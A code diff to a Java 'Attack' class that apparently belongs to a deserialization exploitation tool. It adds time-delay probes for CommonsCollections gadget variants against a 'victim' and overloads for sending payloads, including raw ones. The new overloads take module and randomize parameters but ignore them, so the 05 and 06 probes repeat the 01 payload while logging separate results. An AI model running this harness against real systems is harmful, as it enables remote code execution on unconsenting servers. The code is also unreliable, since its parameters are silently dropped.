@@ -39,9 +39,15 @@ public class Attack {
         final JSONObject sleepJson = AttackTools.payloadSleep(DEFAULT_SLEEP_TIME);
 
         // Basic sleep - does it work?
-        final boolean sleepWorked = applyPayloadOnVictim(sleepJson);
-        log("Sleep worked: %s", sleepWorked);
-        if (!sleepWorked) return;
+        final boolean sleep01Worked = applyPayloadOnVictim(sleepJson);
+        log("Sleep Commons01 worked: %s", sleep01Worked);
+        final boolean sleep05Worked = applyPayloadOnVictim(sleepJson, true, 5, null);
+        log("Sleep Commons05 worked: %s", sleep05Worked);
+        final boolean sleep06Worked = applyPayloadOnVictim(sleepJson, true, 6, null);
+        log("Sleep Commons06 worked: %s", sleep06Worked);
+
+        // CommonsCollections 2,3,4 are using template with Code construction javassist.
+        // This module is not implemented yet.
 
         // Java version counter, all java versions, to be sure
         for(int i = 4; i <= 8; i++){
@@ -301,13 +307,26 @@ public class Attack {
     }
 
     protected boolean applyPayloadOnVictim(Collection<JSONObject> objs) throws Exception {
+        return applyPayloadOnVictim(objs, true, null, null);
+    }
+
+    protected boolean applyPayloadOnVictim(Collection<JSONObject> objs, boolean randomize, Integer module, JSONObject aux) throws Exception {
         final JSONObject pSpec2 = AttackTools.payloadWithExec(objs);
         final List<RunResult> results2 = runPayloadAttempt(pSpec2);
         return wasVictimExcited(results2);
     }
 
     protected boolean applyPayloadOnVictim(JSONObject obj) throws Exception {
+        return applyPayloadOnVictim(obj, true, null, null);
+    }
+
+    protected boolean applyPayloadOnVictim(JSONObject obj, boolean randomize, Integer module, JSONObject aux) throws Exception {
         return applyPayloadOnVictim(Collections.singletonList(obj));
+    }
+
+    protected boolean applyRawPayloadOnVictim(JSONObject spec) throws Exception {
+        final List<RunResult> results2 = runPayloadAttempt(spec);
+        return wasVictimExcited(results2);
     }
 
     /**
